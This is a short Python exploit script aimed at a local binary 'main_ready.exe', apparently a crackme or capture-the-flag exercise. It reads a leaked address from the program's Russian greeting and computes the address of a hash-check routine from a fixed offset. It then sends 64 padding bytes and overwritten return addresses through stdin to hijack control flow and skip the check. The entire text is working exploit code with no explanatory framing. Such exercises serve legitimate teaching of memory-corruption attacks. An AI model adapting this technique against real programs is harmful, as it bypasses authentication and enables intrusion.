import sys
import subprocess
import re

program_name = "./main_ready.exe"
process = subprocess.Popen([program_name], stdin=subprocess.PIPE, stdout=subprocess.PIPE)
line = process.stdout.readline().decode("utf-8")
address_srch = re.search("Привет, 0x((?:[0-9]|[a-f]){16}). Ты меня вызывал?", line)
address = None
if address_srch:
	address = address_srch.group(1)
address = int(address, 16)
hash_is_right_address = address + (0x140001422 - 0x140001032)
input_bytes = bytes("A" * 64, encoding="utf-8")
input_bytes += hash_is_right_address.to_bytes(8, byteorder="little")
input_bytes += address.to_bytes(8, byteorder="little")
process.stdin.write(input_bytes)
process.stdin.flush()
while True:
	output = process.stdout.readline()
	if not output:
		break
	print(output.decode("utf-8"), end='')
